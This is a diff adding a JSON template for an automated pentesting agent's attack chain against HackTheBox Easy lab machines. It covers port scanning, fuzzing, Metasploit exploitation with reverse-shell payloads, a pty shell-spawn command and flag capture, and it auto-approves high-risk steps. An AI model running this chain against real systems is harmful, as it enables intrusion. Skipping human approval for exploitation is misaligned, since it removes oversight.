@@ -1,0 +1,119 @@
+{
+  "template_id": "htb_easy",
+  "name": "HTB Easy Machine — Standard Attack Sequence",
+  "description": "Automated attack chain for HackTheBox Easy-rated machines. Covers port discovery → web fuzzing → vulnerability scan → CVE exploitation → post-exploitation → flag capture.",
+  "version": "1.0.0",
+  "auto_approve_risk_level": "high",
+  "phases": [
+    {
+      "phase": "recon",
+      "name": "Port Scan",
+      "tool": "naabu",
+      "params": {
+        "ports": "top-1000",
+        "service_detection": true
+      },
+      "on_failure": "continue",
+      "description": "Fast TCP port scan with service detection on top 1000 ports."
+    },
+    {
+      "phase": "recon",
+      "name": "Web Discovery (ffuf)",
+      "tool": "ffuf",
+      "params": {
+        "wordlist": "common",
+        "extensions": ["php", "html", "txt", "bak", "old"],
+        "status_codes": [200, 301, 302, 403],
+        "rate_limit": 100
+      },
+      "condition": "http_ports_found",
+      "on_failure": "continue",
+      "description": "Directory and file brute-force on all discovered HTTP/HTTPS services."
+    },
+    {
+      "phase": "vuln_discovery",
+      "name": "Nuclei Vulnerability Scan",
+      "tool": "nuclei",
+      "params": {
+        "severity": ["critical", "high", "medium"],
+        "templates": ["cve", "sqli", "xss", "rce", "lfi", "ssrf"],
+        "rate_limit": 50
+      },
+      "on_failure": "continue",
+      "description": "Template-based vulnerability scan covering critical/high/medium severities."
+    },
+    {
+      "phase": "exploitation",
+      "name": "CVE Exploitation (Metasploit)",
+      "tool": "metasploit",
+      "params": {
+        "lport": 4444,
+        "payload_preference": ["meterpreter/reverse_tcp", "cmd/unix/interact"],
+        "timeout": 60
+      },
+      "on_failure": "next_candidate",
+      "retry": {
+        "max_attempts": 3,
+        "backoff_seconds": 5
+      },
+      "description": "Attempt exploitation of top-ranked CVE candidates using Metasploit modules."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Session Upgrade",
+      "tool": "metasploit",
+      "params": {
+        "upgrade_to_meterpreter": true,
+        "pty_spawn": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "stabilize_shell": true
+      },
+      "on_failure": "continue",
+      "description": "Upgrade plain shell to Meterpreter; stabilize TTY for interactive use."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "System Enumeration",
+      "tool": "metasploit",
+      "params": {
+        "commands": ["sysinfo", "getuid", "id", "whoami", "hostname", "ifconfig"]
+      },
+      "on_failure": "continue",
+      "description": "Collect system information: OS, user context, network interfaces."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Flag Capture",
+      "tool": "flag_capture",
+      "params": {
+        "paths": [
+          "/root/root.txt",
+          "/root/flag.txt",
+          "/root/proof.txt",
+          "/home/**/user.txt",
+          "/home/**/flag.txt",
+          "C:\\Users\\Administrator\\Desktop\\root.txt",
+          "C:\\Users\\Administrator\\Desktop\\proof.txt"
+        ],
+        "verify_md5": true,
+        "store_neo4j": true
+      },
+      "on_failure": "continue",
+      "description": "Capture CTF-style flags from standard locations and verify 32-char hex format."
+    }
+  ],
+  "target_profile": {
+    "difficulty": "easy",
+    "platform": ["linux", "windows"],
+    "typical_services": ["ssh", "http", "https", "ftp", "smb"],
+    "success_criteria": {
+      "min_flags": 1,
+      "target_flags": 2,
+      "target_flag_names": ["user.txt", "root.txt"]
+    }
+  },
+  "metadata": {
+    "created": "2026-03-13",
+    "author": "UniVex — Betterment Plan Week 11",
+    "retired_machines_tested": ["Lame", "Jerry", "Legacy", "Blue", "Optimum"]
+  }
+}
